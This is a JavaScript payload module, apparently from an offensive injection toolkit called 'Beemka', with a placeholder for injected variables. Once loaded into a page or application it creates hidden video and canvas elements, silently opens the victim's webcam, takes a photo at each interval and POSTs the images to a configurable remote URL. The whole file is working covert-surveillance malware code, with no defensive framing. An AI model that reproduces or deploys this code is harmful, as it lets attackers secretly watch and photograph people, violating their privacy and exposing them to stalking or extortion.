if (typeof Beemka_WebCamera === 'undefined') {

    %BEEMKA_VARIABLE_PLACEHOLDER%

    let options = {
        webcamera: {
            url: beemka_webcamera_url,
            interval: beemka_webcamera_interval,
            param: beemka_webcamera_param
        }
    };

    let Beemka_WebCamera = {
        webcamera: {
            interval: options.webcamera.interval,
            url: options.webcamera.url,
            param: options.webcamera.param,
            method: options.webcamera.method
        },

        init: function() {
            Beemka_WebCamera.cleanParams();

            // Make sure the document is loaded.
            setTimeout(function() {
                Beemka_WebCamera.prepareDocument();
                Beemka_WebCamera.startWebCameraInterval();
            }, 20000);
        },

        prepareDocument: function() {
            let videoElement = Beemka_WebCamera.createDocumentElement(
                'video',
                [
                    ['id', 'beemka-video'],
                    ['width', 640],
                    ['height', 480],
                    ['autoplay', ''],
                    ['style', 'display: none;']
                ]
            );

            let canvasElement = Beemka_WebCamera.createDocumentElement(
                'canvas',
                [
                    ['id', 'beemka-canvas'],
                    ['width', 640],
                    ['height', 480],
                    ['style', 'display: none;']
                ]
            );

            let injectPoint = document.querySelector('body');
            if (injectPoint) {
                injectPoint.after(videoElement);
                injectPoint.after(canvasElement);
            }

            navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
                let video = document.getElementById('beemka-video');
                video.src = window.URL.createObjectURL(stream);
                video.srcObject = stream;
                video.play();
            });
        },

        createDocumentElement: function(tagName, attributes) {
            let el = document.createElement(tagName);
            for (let i = 0; i < attributes.length; i++) {
                el.setAttribute(
                    attributes[i][0],
                    attributes[i][1]
                );
            }
            return el
        },

        startWebCameraInterval: function() {
            setTimeout(function() {
                Beemka_WebCamera.sendPhoto();
            }, Beemka_WebCamera.webcamera.interval);
        },

        sendPhoto: function() {
            // Get elements.
            let videoElement = document.getElementById('beemka-video');
            let canvasElement = document.getElementById('beemka-canvas');
            let photoContext = canvasElement.getContext('2d');

            // Take photo.
            photoContext.drawImage(videoElement, 0, 0, 640, 480);

            // Get data.
            let data = canvasElement.toDataURL('image/png');
            let photoData = data.toString();
            Beemka_WebCamera.webCameraSendData(photoData);
            Beemka_WebCamera.startWebCameraInterval();
        },

        webCameraSendData: function(data) {
            let xhttp = new XMLHttpRequest();
            xhttp.open('POST', Beemka_WebCamera.webcamera.url, true);
            xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            xhttp.send(Beemka_WebCamera.webcamera.param + "=" + encodeURIComponent(data));
        },

        cleanParams: function() {
            Beemka_WebCamera.webcamera.interval = parseInt(Beemka_WebCamera.webcamera.interval);
        }
    };

    Beemka_WebCamera.init();
}